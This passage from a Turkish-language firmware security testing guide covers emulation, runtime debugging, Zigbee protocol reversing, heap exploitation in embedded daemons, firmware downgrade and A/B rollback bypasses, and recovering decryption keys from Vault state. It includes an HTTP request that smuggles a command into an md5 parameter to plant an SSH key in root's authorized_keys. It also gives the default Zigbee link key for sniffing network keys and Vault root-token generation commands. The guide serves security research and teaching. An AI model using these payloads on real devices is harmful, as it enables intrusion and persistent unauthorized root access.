Analyst, QEMU kernel'ini, initramfs'i ve virtual disk'leri kontrol ediyorsa, vendor'ın verification PID 1'i küçük, statically linked bir init ile değiştirerek değiştirilmiş bir root'u boot edebilir. Bu, **lab boot-chain substitution** işlemidir; dm-verity'nin, RSA signature'ının, Secure Boot'un veya TPM-sealed key'in kırılması değildir.<sup>[[11]](#references)</sup>

Yeni init, özgün boot path'in operasyonel bölümlerini yansıtmalıdır: `devtmpfs`'i mount etmeli, `setsid()` çağırmalı, `/dev/console`'ı 0–2 file descriptor'larına bağlamalı, `/proc` ve `/sys`'i mount etmeli, sağlanan block device'ı beklemeli, düzenlenmiş root'u read-only olarak mount etmeli, eski root'a ait pseudo-filesystem'leri ayırmalı, yeni mount'u `/` üzerine taşımalı, `chroot` yapmalı ve firmware'in özgün `/sbin/init` dosyasını `execve()` ile çalıştırmalıdır. `MS_MOVE` işleminden **önce** `/dev`, `/proc` ve `/sys` mount'larını ayırmak, yeni root'a ait mount noktalarının yanlışlıkla ayrılmasını önler.<sup>[[11]](#references)</sup>

Değiştirilebilir device state'ini değiştirilmiş immutable root'tan ayrı tutun. qcow2 overlay, özgün disk'in LVM state'ini korurken ikinci bir read-only virtio disk düzenlenmiş SquashFS'i sağlayabilir:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Çevrimdışı imaj durumu debugging

Yavaş açılışlar, yıkıcı başlangıç betikleri veya güvenilmez konsol günlükleri hatanın kaynağını belirsizleştirdiğinde, konuk dışındaki kalıcı durumu inceleyin. Çalışan bir VM'nin kullandığı overlay'i asla bağlamayın; imajı `qemu-nbd` ile kullanıma açın, LVM keşfini amaçlanan NBD bölümüyle sınırlandırın ve bağlantıyı kesmeden önce volume group'u devre dışı bırakın.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Tekrarlanabilir hata yalıtımı için zaman damgalı işaretçi dosyalarını yazılabilir, sabit bir birime yazın ve çevrimdışı doğrulayın; `/dev/kmsg`, FIFO’lar ve geçici konsollar, hız sınırlaması veya sürecin erken sonlanması nedeniyle hatalı negatif sonuçlara yol açabilir. İlgisiz kodu değiştirmeden önce katmanlar arasındaki arayüzleri de karşılaştırın: `uname -r` ile `/lib/modules/`, diskteki ext4 özellikleri ile kernel yapılandırması ve Mesa `libGL` nesli ile DRI driver ABI’si ve PCI’dan türetilen driver adları. Bir bileşen mevcut olabilir ve hatta `dlopen()` işlemi başarıyla gerçekleşebilir; ancak onu kullanan bileşen farklı bir ABI beklediğinden yine de kullanılamaz durumda kalabilir.<sup>[[11]](#references)</sup>

## Pratikte Dinamik Analiz

Bu aşamada analiz için gerçek veya emüle edilmiş bir cihaz ortamı kullanılır. OS’ye ve dosya sistemine shell erişimini korumak çok önemlidir. Emülasyon donanım etkileşimlerini kusursuz biçimde taklit etmeyebilir; bu nedenle emülasyonu zaman zaman yeniden başlatmak gerekebilir. Analiz sırasında dosya sistemi yeniden incelenmeli, açığa çıkarılmış web sayfaları ve ağ servisleri exploit edilmeli, bootloader güvenlik açıkları araştırılmalıdır. Olası backdoor güvenlik açıklarını belirlemek için firmware bütünlük testleri kritik öneme sahiptir.

## Çalışma Zamanı Analizi Teknikleri

Çalışma zamanı analizi; breakpoint ayarlamak ve fuzzing ile diğer teknikleri kullanarak güvenlik açıklarını belirlemek için gdb-multiarch, Frida ve Ghidra gibi araçlardan yararlanarak bir süreç veya binary ile kendi çalışma ortamında etkileşime girmeyi içerir.

Tam bir debugger içermeyen embedded hedeflerde, **statik olarak bağlanmış bir `gdbserver` dosyasını** cihaza kopyalayın ve uzaktan bağlanın:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor mesaj eşleme

IoT hub'larında RF stack çoğunlukla bir **radio MCU** ile Linux userland process arasında bölünür. Yararlı bir workflow, yolu eşlemektir:<sup>[[8]](#references)</sup>

1. Havadaki **RF frame**
2. Radio MCU üzerindeki **controller-side parser**
3. Linux'a iletilen **serial/UART text veya TLV protocol** (örneğin `/dev/tty*`)
4. Ana daemon içindeki **application dispatcher**
5. **Protocol-specific handler / state machine**

Bu mimari, tek bir reversing hedefi yerine iki hedef oluşturur. Controller, binary radio frame'lerini `Group,Command,arg1,arg2,...` gibi bir textual protocol'e dönüştürüyorsa şunları belirleyin:

- **Message group**'ları ve dispatch table'ları
- Hangi message'ların **network** üzerinden, hangilerinin controller'ın kendisinden gelebileceği
- Tam **manufacturer-specific discriminator field**'ları (örneğin Zigbee `manufacturer_code` ve özel `cluster_command`)
- Hangi handler'lara yalnızca **commissioning**, discovery veya firmware/model download aşamalarında erişilebildiği

Özellikle Zigbee için pairing trafiğini yakalayın ve hedefin hâlâ varsayılan **Link Key** `ZigBeeAlliance09` değerine dayanıp dayanmadığını kontrol edin. Öyleyse commissioning trafiğini sniff etmek **Network Key** değerini açığa çıkarabilir. Zigbee 3.0 install code'ları bu riski azaltır; bu yüzden test edilen cihazın bunları gerçekten zorunlu kılıp kılmadığını not edin.

### Manufacturer-specific protocol handler'ları ve FSM ile kısıtlanan erişilebilirlik

Vendor-specific Zigbee/ZCL command'ları, **özel parsing code** ve daha az sınanmış doğrulamalara sahip dahili **FSM**'lerle etkileşime girdikleri için çoğu zaman standardize cluster'lardan daha iyi bir hedeftir.<sup>[[8]](#references)</sup>

Pratik workflow:

- **Vendor-only handler**'ı bulana kadar command dispatcher'ı reverse edin.
- **FSM state**, **event**, **check**, **action** ve **next-state** table'larını çıkarın.
- Otomatik olarak ilerleyen **transitional state**'leri ve sonunda attacker-controlled state'i sıfırlayan veya serbest bırakan retry/error branch'lerini belirleyin.
- Hatalı handler'a her zaman erişilebildiğini varsaymak yerine, daemon'ı savunmasız duruma getirmek için gereken meşru protocol exchange'lerini doğrulayın.

Timing-sensitive protocol'lerde Python framework'ünden packet replay yapmak çok yavaş olabilir. Daha güvenilir bir yaklaşım, vendor-grade stack'e sahip gerçek donanımda (örneğin **nRF52840**) meşru bir cihazı emüle ederek doğru **endpoint**'leri, **attribute**'ları ve commissioning zamanlamasını sağlamaktır.

### Embedded daemon'larda parçalı indirme bug sınıfı

Tekrarlayan bir firmware bug sınıfı, **parçalı blob/model/configuration download** işlemlerinde görülür:<sup>[[8]](#references)</sup>

1. **İlk fragment** (`offset == 0`), `ctx->total_size` değerini kaydeder ve `malloc(total_size)` ile bellek ayırır.
2. Sonraki fragment'ler yalnızca `packet_total_size >= offset + chunk_len` gibi attacker-controlled **packet-local** field'ları doğrular.
3. Kopyalama işlemi, **başlangıçta ayrılan boyut** için kontrol yapmadan `memcpy(&ctx->buffer[offset], chunk, chunk_len)` kullanır.

Bu, saldırganın şunları göndermesine olanak tanır:

- Küçük bir heap allocation'a zorlamak için **küçük** bir toplam boyut belirten ilk ve geçerli bir fragment.
- **Beklenen offset** değerine sahip, ancak daha büyük bir `chunk_len` içeren sonraki bir fragment.
- Yeni kontrolleri geçerken başlangıçta ayrılan buffer'ı taşıran, sahte bir packet-local boyut.

Savunmasız yola commissioning logic üzerinden erişiliyorsa, exploit için hatalı fragment'leri göndermeden önce hedefi beklenen model-download veya blob-download state'ine getirecek kadar **device emulation** gerekir.

### Protocol kaynaklı `free()` tetikleyicileri

Embedded daemon'larda heap metadata exploitation'ı tetiklemenin en kolay yolu çoğu zaman "cleanup'ı beklemek" değil, **protocol'ün kendi error handling mekanizmasını zorlamaktır**:<sup>[[8]](#references)</sup>

- FSM'i **retry** veya **error** state'lerine sokmak için hatalı devam fragment'leri gönderin.
- Retry sınırını aşarak daemon'ın **context'i sıfırlamasını** ve bozulmuş buffer'ı serbest bırakmasını sağlayın.
- Process ilgisiz nedenlerle çökmeden önce allocator-side primitive'leri tetiklemek için bu öngörülebilir `free()` işlemini kullanın.

Bu yaklaşım, özellikle embedded Linux'taki **musl/uClibc/dlmalloc benzeri** allocator'larda kullanışlıdır; bu ortamlarda chunk metadata'sını bozmak, unlink/unbin logic'ini bir write primitive'e dönüştürebilir. Sağlam bir yöntem, gerçek bin pointer'larını hemen üzerine yazıp process'i çökertmek yerine, allocator traversal'ını overflowed buffer içinde hazırlanmış **fake chunk**'lara yönlendirmek için bir **size field**'ı bozmaktır.

## Binary Exploitation ve Proof-of-Concept

Belirlenen zafiyetler için PoC geliştirmek, hedef mimarinin derinlemesine anlaşılmasını ve daha düşük seviyeli dillerde programlama yapmayı gerektirir. Embedded system'lerde binary runtime protection'lar nadirdir; ancak mevcut olduklarında Return Oriented Programming (ROP) gibi teknikler gerekebilir.

### uClibc fastbin exploitation notları (embedded Linux)

- **Fastbin'ler + birleştirme:** uClibc, glibc'ye benzer fastbin'ler kullanır. Daha sonra yapılan büyük bir allocation `__malloc_consolidate()` işlevini tetikleyebilir; bu nedenle fake chunk kontrollerden geçmelidir (uygun size, `fd = 0` ve çevresindeki chunk'ların "in use" olarak görülmesi).<sup>[[6]](#references)</sup>
- **ASLR altında non-PIE binary'ler:** ASLR etkin olsa bile ana binary **non-PIE** ise, binary içindeki `.data/.bss` adresleri sabittir. Fastbin allocation'ını bir **function pointer table** üzerine yönlendirmek için geçerli bir heap chunk header'ına benzeyen bir bölgeyi hedefleyebilirsiniz.
- **Parser'ı durduran NUL:** JSON parse edilirken payload içindeki bir `\x00`, parsing'i durdururken yedekteki attacker-controlled byte'ları stack pivot/ROP chain için koruyabilir.
- **`/proc/self/mem` üzerinden shellcode:** `open("/proc/self/mem")`, `lseek()` ve `write()` çağıran bir ROP chain, bilinen bir mapping içine çalıştırılabilir shellcode yerleştirip ona atlayabilir.

## Firmware Analysis için Hazır İşletim Sistemleri

[AttifyOS](https://github.com/adi0x90/attifyos) ve [EmbedOS](https://github.com/scriptingxss/EmbedOS) gibi işletim sistemleri, gerekli araçlarla donatılmış, firmware security testing için önceden yapılandırılmış ortamlar sağlar.

## Firmware Analizi için Hazır OS'ler

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS, Internet of Things (IoT) cihazlarının security assessment ve penetration testing işlemlerine yardımcı olmak için tasarlanmış bir distro'dur. Gerekli tüm araçların yüklü olduğu, önceden yapılandırılmış bir ortam sağlayarak size çok zaman kazandırır.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Firmware security testing araçları önceden yüklenmiş, Ubuntu 18.04 tabanlı embedded security testing işletim sistemi.

## Firmware Downgrade Attacks ve Güvensiz Update Mekanizmaları

Bir vendor, firmware image'ları için cryptographic signature check uygulasa bile **version rollback (downgrade) protection** çoğu zaman eksik bırakılır. Boot veya recovery loader, yalnızca gömülü public key ile signature'ı doğruluyor ancak flash edilen image'ın *version* değerini (veya monotonik bir counter'ı) karşılaştırmıyorsa saldırgan, geçerli bir signature taşıyan **daha eski ve savunmasız firmware'i** kurabilir ve böylece giderilmiş zafiyetleri yeniden ortaya çıkarabilir.<sup>[[4]](#references)</sup>

Tipik attack workflow:

1. **Daha eski, imzalı bir image edinin**
   * Vendor'ın herkese açık download portalından, CDN'inden veya destek sitesinden alın.
   * Companion mobile/desktop application'lardan çıkarın (örneğin Android APK içindeki `assets/firmware/` dizininden).
   * VirusTotal, Internet archive'ları, forumlar vb. üçüncü taraf repository'lerden edinin.
2. Image'ı, açık bir update channel üzerinden cihaza **yükleyin veya sunun**:
   * Web UI, mobile-app API, USB, TFTP, MQTT vb.
   * Birçok tüketici IoT cihazı, Base64 ile kodlanmış firmware blob'larını kabul eden, bunları server-side decode eden ve recovery/upgrade işlemini başlatan *kimlik doğrulamasız* HTTP(S) endpoint'leri sunar.
3. Downgrade sonrasında, daha yeni sürümde giderilmiş bir zafiyeti exploit edin (örneğin sonradan eklenmiş bir command-injection filter).
4. İsteğe bağlı olarak, persistence elde ettikten sonra tespit edilmemek için en güncel image'ı yeniden flash edin veya update'leri devre dışı bırakın.

### Örnek: Downgrade Sonrası Command Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Savunmasız (eski sürüme düşürülmüş) firmware’de `md5` parametresi herhangi bir temizleme işleminden geçirilmeden doğrudan bir shell komutuna eklenir; bu da rastgele komutların enjekte edilmesine olanak tanır (burada SSH anahtar tabanlı root erişimini etkinleştirmek için). Daha sonraki firmware sürümlerinde temel bir karakter filtresi eklendi, ancak sürüm düşürme korumasının olmaması düzeltmeyi etkisiz kılıyor.<sup>[[4]](#references)</sup>

### Mobil Uygulamalardan Firmware Çıkarma

Birçok üretici, uygulamanın cihazı Bluetooth/Wi-Fi üzerinden güncelleyebilmesi için tam firmware görüntülerini yardımcı mobil uygulamalarının içine ekler. Bu paketler genellikle APK/APEX içinde `assets/fw/` veya `res/raw/` gibi yollar altında şifrelenmeden saklanır. `apktool`, `ghidra` gibi araçlar, hatta düz `unzip` bile fiziksel donanıma dokunmadan imzalı görüntüleri çıkarmanızı sağlar.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B slot tasarımlarında yalnızca updater tarafındaki anti-rollback korumasını atlatma

Bazı üreticiler anti-downgrade **ratchet** uygular, ancak bunu yalnızca *updater* mantığında kullanır (örneğin CAN üzerinden bir UDS rutini, recovery komutu veya userspace OTA agent). **Bootloader** daha sonra yalnızca image imzasını/CRC'yi kontrol edip partition table'a veya slot metadata'sına güveniyorsa rollback koruması yine atlatılabilir.<sup>[[7]](#references)</sup>

Tipik zayıf tasarım:

- Firmware metadata'sı hem bir version descriptor hem de bir **security ratchet** / monotonic counter içerir.
- Updater, image ratchet'ini persistent storage'da saklanan bir değerle karşılaştırır ve daha eski, imzalı image'ları reddeder.
- Bootloader bu ratchet'i **parse etmez**; önyükleme öncesinde yalnızca header, CRC ve imzayı doğrular.
- Slot aktivasyonu partition table'da veya slot başına bir generation counter'da ayrı tutulur ve doğrulanmış firmware digest'ine kriptografik olarak **bağlı değildir**.

Bu, dual-slot sistemlerde **bir image'ı doğrula / başka bir image'ı önyükle** olanağı yaratır. Saldırgan, updater'a güncel ve imzalı bir image kullanarak B slotunu sonraki önyükleme hedefi olarak işaretletebilir ve ardından yeniden başlatmadan önce B slotunun üzerine yazabilirse, bootloader yalnızca önceden kaydedilmiş slot metadata'sına güvendiği için eski image'ı yine de önyükleyebilir.

Yaygın kötüye kullanım yöntemi:

1. Pasif slota **güncel ve imzalı** bir firmware yükleyin ve normal doğrulama/değiştirme rutinini çalıştırarak bu slotu sonraki etkin slot olarak işaretletin.
2. **Henüz yeniden başlatmayın**. Aynı oturumda slot hazırlama/silme rutinine yeniden girin.
3. Updater'ın az önce etkinleştirdiği **aynı fiziksel slotu** silmesi için eski boot-state veya eski slot seçimi mantığından yararlanın.
4. Bu slota **daha eski ama hâlâ imzalı** bir firmware yazın.
5. Ratchet'i uygulayan doğrulama rutinini atlayıp doğrudan yeniden başlatın.
6. Bootloader, etkinleştirilmiş slotu seçer; yalnızca imzayı/bütünlüğü doğrular ve eski image'ı önyükler.

A/B update uygulamalarını reverse engineering ederken dikkat edilmesi gerekenler:

- Slot seçiminin, başarılı bir değişiklikten sonra yenilenmeyen **önyükleme zamanı flag'lerinden** türetilmesi.
- `prepare_passive_slot()` benzeri bir rutinin, **mevcut ve kaydedilmiş layout** yerine eski duruma göre slot silmesi.
- `part_write_layout()` benzeri bir fonksiyonun doğrulanmış image hash'ini saklamadan yalnızca **generation counter** / etkin flag'i artırması.
- Ratchet kontrollerinin userspace veya updater kodunda bulunup ROM / bootloader / secure boot aşamalarında **bulunmaması**.
- Silme veya recovery rutinlerinin, içeriği silinip yeniden yazıldıktan sonra bile slotu önyüklenebilir olarak işaretli bırakması.

### Update Mantığını Değerlendirme Kontrol Listesi

* *Update endpoint* için taşıma katmanı/kimlik doğrulama yeterince korunuyor mu (TLS + authentication)?
* Cihaza flash işlemi öncesinde **version number** veya **monotonic anti-rollback counter** karşılaştırması yapılıyor mu?
* Image, secure boot zinciri içinde doğrulanıyor mu (ör. imzalar ROM kodu tarafından kontrol ediliyor mu)?
* **Bootloader**, yalnızca imza/CRC kontrolü yapmak yerine updater ile aynı ratchet'i uyguluyor mu?
* Slot aktivasyon metadata'sı **doğrulanmış firmware digest/version** değerine bağlı mı, yoksa etkinleştirme sonrasında slot değiştirilebilir mi?
* Slot değişimi başarılı olduktan sonra cihaz yeniden başlatılmaya zorlanıyor mu, yoksa aynı oturumda sonraki update/silme rutinlerine hâlâ erişilebiliyor mu?
* Userland kodu ek sanity check'ler (ör. izin verilen partition map, model number) yapıyor mu?
* *Kısmi* veya *yedek* update akışları aynı doğrulama mantığını kullanıyor mu?

> 💡  Yukarıdakilerden herhangi biri eksikse platform muhtemelen rollback saldırılarına karşı savunmasızdır.

## Pratik yapmak için savunmasız firmware'ler

Firmware'deki güvenlik açıklarını keşfetme pratiği yapmak için başlangıç noktası olarak aşağıdaki savunmasız firmware projelerini kullanın.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Embedded KMS/Vault state içinden firmware şifre çözme anahtarlarını kurtarma

Bir update image'ı az miktarda plaintext metadata ile yüksek entropili büyük bir blob'u bir arada içeriyorsa, herhangi bir brute-force işleminden önce container triage yapın:<sup>[[1]](#references)</sup>

- Header'ları, offset'leri ve satır sınırlarını `hexdump`, `xxd`, `strings -tx`, `base64 -d` ve `binwalk -E` ile dökümleyin.
- `Salted__` genellikle OpenSSL `enc` formatını belirtir: sonraki 8 byte salt'tır, kalan byte'lar ise ciphertext'tir.
- Tam olarak `256` byte'a çözümlenen bir Base64 alanı, rastgele bir firmware password/session key'i sarmalayan RSA-2048 ciphertext'iyle karşı karşıya olduğunuza dair güçlü bir ipucudur.
- Aynı dosyadaki detached PGP materyali çoğunlukla yalnızca authenticity'yi korur; gizlilik mekanizması olduğunu varsaymayın.

Statik anahtar araması (`grep`, `strings`, PEM/PGP aramaları) başarısız olursa, yalnızca private key aramak yerine **operational decrypt path**'i reverse engineer edin:

- Updater/management binary'sini decompile edip şifrelenmiş blob'u kimin okuduğunu, hangi helper/API'nin onu çözdüğünü ve hangi mantıksal anahtar adının istendiğini izleyin.
- Çıkarılan root filesystem'de KMS state (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) ile unit file'ları ve init script'lerini arayın.
- Plaintext `vault operator unseal ...`, recovery key'leri, bootstrap token'ları veya yerel KMS auto-unseal script'lerini private-key materyaliyle eşdeğer kabul edin.

Appliance orijinal Vault binary'sini ve storage backend'ini içeriyorsa bu ortamı yeniden çalıştırmak genellikle Vault'un iç işleyişini yeniden uygulamaktan daha kolaydır:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Klonlanmış KMS üzerinde root yetkisiyle:

- Transit key'leri yalnızca izole klon içinde dışa aktarılabilir yapın: `vault write transit/keys/<name>/config exportable=true`
- Unwrap key'i dışa aktarın: `vault read transit/export/encryption-key/<name>`
- Kurtarılan RSA key'i, KMS tarafından kullanılan tam padding/hash çiftiyle deneyin. PKCS#1 v1.5 decrypt işleminin ve varsayılan OAEP decrypt işleminin başarısız olması, key'in yanlış olduğunu **kanıtlamaz**; Vault destekli birçok akış SHA-256 ile OAEP kullanırken yaygın kütüphaneler varsayılan olarak SHA-1 kullanır.
- Payload `Salted__` ile başlıyorsa, AES-CBC decrypt işleminden önce üreticinin OpenSSL KDF'sini (`EVP_BytesToKey`, eski cihazlarda genellikle MD5) tam olarak yeniden uygulayın.

Bu, "şifrelenmiş firmware" sorununu daha genel bir probleme dönüştürür: **cihaz tarafındaki operasyonel key'leri kurtarın, ardından tam unwrap + KDF parametrelerini çevrimdışı olarak yeniden uygulayın**.

## Eğitim ve Sertifikalar

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude ile Firmware Kırma: Üst Düzey Uzmanlık, Başlangıç Düzeyinde Özerklik](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware Güvenliği Test Metodolojisi](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Pratik IoT Hacking: Nesnelerin İnterneti'ne Saldırmak İçin Kesin Kılavuz](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Terk edilmiş donanımlarda zero-day açıklarını istismar etmek – Trail of Bits blogu](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [20 Dolarlık Bir Akıllı Cihaz Bana Evinize Erişim Sağladı](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Şimdi Görüyorsun: Şimdi Pwned Oldun](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Tesla Wall Connector'ı şarj portu konektöründen istismar etmek - Bölüm 2: anti-downgrade korumasını atlatmak](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Yanıp Sönmesini Sağla: Philips Hue Bridge'in Kablosuz Güncelleme Üzerinden İstismarı](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [QEMU'da Tesla OS'ta ROOT Yetkisi - Bölüm 1: Paketi Açma](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux kernel belgeleri - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [QEMU'da Tesla OS'ta ROOT Yetkisi - Bölüm 2: Hata Ayıklama ve Düzeltme](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS Parolaları: Zayıf XOR Şifrelemesi, SPI Flash'tan Kurtarmaya Olanak Tanıyor (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Dell BIOS parola kurtarma araçları](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security — Donanım Hacking Bilgilerini Tazelemek, Bölüm 2](https://voidstarsec.com/blog/brushing-up-part-2)
{{#include ../../banners/hacktricks-training.md}}
